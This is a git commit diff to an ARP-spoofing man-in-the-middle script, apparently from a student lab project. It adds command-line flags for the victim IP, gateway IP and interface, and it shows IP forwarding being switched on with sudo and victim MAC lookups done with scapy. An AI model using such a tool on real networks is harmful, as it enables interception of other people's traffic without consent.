d2c526668b7c484bea0788c9d1ebe4c1b40e373b
VessieGerova <veselina.gerova0402@gmail.com>
2021-06-02 22:17:43 +0200

    with flags

--- attack_executable.py
+++ attack_executable.py
@@ -2,8 +2,18 @@
 import sys
 import time
 import os
+import argparse
 
-#python attack_executable.py Target_IP Gateway_IP Interface
+#python attack_executable.py -t Target_IP -g Gateway_IP -intf Interface
+
+parser = argparse.ArgumentParser()
+
+#-t Target_IP  -g Gateway_IP -intf Interface 
+parser.add_argument("-t", "--target", help="Target_IP")
+parser.add_argument("-g", "--gateway", help="Gateway_IP")
+parser.add_argument("-intf", "--interface", help="Interface")
+
+args = parser.parse_args()
 
 from arp import spoof
 from scapy.all import get_if_hwaddr, getmacbyip
@@ -12,18 +22,18 @@ if __name__ == "__main__":
     print("Enabling ip forwarding")
     os.system("echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward")
     # iface = "enp0s3"
-    iface =str(sys.argv[3])
+    iface = args.interface
     # Leon's victim
     # ip_victim = "192.168.192.16"
     # ip_victim = "192.168.192.7"
-    ip_victim = str(sys.argv[1])
+    ip_victim = args.target
     # Karolina's victim
     # ip_victim = "192.168.0.39"
     # mac_victim = get_mac(ip_victim, iface)
     mac_victim = getmacbyip(ip_victim)
     print(mac_victim)
     # Leon's gateway
-    ip_to_spoof = str(sys.argv[2])
+    ip_to_spoof = args.gateway
     # Karolina's gateway
     # ip_to_spoof = "192.168.0.1"
 
